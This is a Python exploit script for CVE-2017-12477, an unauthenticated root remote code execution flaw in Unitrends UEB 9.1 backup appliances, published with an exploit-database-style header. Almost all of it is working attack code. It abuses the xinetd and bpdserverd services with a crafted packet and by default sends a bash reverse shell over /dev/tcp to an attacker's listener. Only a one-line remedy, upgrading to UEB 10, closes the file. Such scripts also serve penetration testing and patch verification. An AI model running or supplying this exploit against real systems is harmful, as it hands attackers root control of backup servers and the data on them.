# Exploit Title: Unauthenticated root RCE for Unitrends UEB 9.1
# Date: 08/08/2017
# Exploit Authors: Jared Arave, Cale Smith, Benny Husted
# Contact: https://twitter.com/iotennui || https://twitter.com/BennyHusted || https://twitter.com/0xC413
# Vendor Homepage: https://www.unitrends.com/
# Software Link: https://www.unitrends.com/download/enterprise-backup-software
# Version: 9.1
# Tested on: CentOS6
# CVE: CVE-2017-12477

import socket
import binascii
import struct
import time
import sys
from optparse import OptionParser

print """
###############################################################################
Unauthenticated root RCE for Unitrends UEB 9.1
Tested against appliance versions:
  [+] 9.1.0-2.201611302120.CentOS6

This exploit uses roughly the same process to gain root execution
as does the apache user on the Unitrends appliance. The process is
something like this:

1.  Connect to xinetd process (it's usually running on port 1743)
2.  This process will send something like: '?A,Connect36092'
3.  Initiate a second connection to the port specified 
    in the packet from xinetd (36092 in this example)
4.  send a specially crafted packet to xinetd, containing the 
    command to be executed as root
5.  Receive command output from the connection to port 36092
6.  Close both connections

NB: Even if you don't strictly need output from your command,
The second connection must still be made for the command
to be executed at all.
###############################################################################
"""

# Parse command line args:
usage = "Usage: %prog -r <appliance_ip> -l <listener_ip> -p <listener_port>\n"\
      "       %prog -r <appliance_ip> -c 'touch /tmp/foooooooooooo'"

parser = OptionParser(usage=usage)
parser.add_option("-r", '--RHOST', dest='rhost', action="store",
          help="Target host w/ UNITRENDS UEB installation")
parser.add_option("-l", '--LHOST', dest='lhost', action="store",
          help="Host listening for reverse shell connection")
parser.add_option("-p", '--LPORT', dest='lport', action="store",
          help="Port on which nc is listening")
parser.add_option("-c", '--cmd', dest='cmd', action="store",
          help="Run a custom command, no reverse shell for you.")
parser.add_option("-x", '--xinetd', dest='xinetd', action="store",
          type="int", default=1743,   
          help="port on which xinetd is running (default: 1743)")

(options, args) = parser.parse_args()

if options.cmd:
  if (options.lhost or options.lport):
    parser.error("[!] Options --cmd and [--LHOST||--LPORT] are mutually exclusive.\n")

  elif not options.rhost:
    parser.error("[!] No remote host specified.\n")

elif options.rhost is None or options.lhost is None or options.lport is None:
  parser.print_help()
  sys.exit(1)

RHOST = options.rhost
LHOST = options.lhost
LPORT = options.lport
XINETDPORT = options.xinetd

if options.cmd:
  cmd = options.cmd
else:
  cmd = 'bash -i >& /dev/tcp/{0}/{1} 0>&1 &'.format(LHOST, LPORT)

def recv_timeout(the_socket,timeout=2):
    the_socket.setblocking(0)
    total_data=[];data='';begin=time.time()
    while 1:
        #if you got some data, then break after wait sec
        if total_data and time.time()-begin>timeout:
            break
        #if you got no data at all, wait a little longer
        elif time.time()-begin>timeout*2:
            break
        try:
            data=the_socket.recv(8192)
            if data:
                total_data.append(data)
                begin=time.time()
            else:
                time.sleep(0.1)
        except:
            pass
    return ''.join(total_data)

print "[+] attempting to connect to xinetd on {0}:{1}".format(RHOST, str(XINETDPORT))

try:
  s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s1.connect((RHOST,XINETDPORT))
except:
  print "[!] Failed to connect!"
  exit()

data = s1.recv(4096)
bpd_port = int(data[-8:-3])

print "[+] Connected! Cmd output will come back on {}:{}".format(RHOST, str(bpd_port))
print "[+] Connecting to bpdserverd on {}:{}".format(RHOST, str(bpd_port))

try:
  s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s2.connect((RHOST, bpd_port))
except:
  print "[!] Failed to connect!"
  s1.close()
  exit()

print "[+] Connected! Sending the following cmd to {0}:{1}".format(RHOST,str(XINETDPORT))
print "[+] '{0}'".format(cmd)

if (len(cmd) > 240):
  print "[!] This command is long; this might not work."
  print "[!] Maybe try a shorter command..."

cmd_len = chr(len(cmd) + 3)
packet_len = chr(len(cmd) + 23)

packet = '\xa5\x52\x00\x2d'
packet += '\x00' * 3
packet += packet_len
packet += '\x00' * 3
packet += '\x01'
packet += '\x00' * 3
packet += '\x4c'
packet += '\x00' * 3
packet += cmd_len
packet += cmd
packet += '\x00' * 3

s1.send(packet)

print "[+] cmd packet sent!"
print "[+] Waiting for response from {0}:{1}".format(RHOST,str(bpd_port))

data = recv_timeout(s2)

print "[+] Here's the output -> \n\n"

print data

print "[+] Closing ports, exiting...."

s1.close()
s2.close()

# 3. Solution:
# Update to Unitrends UEB 10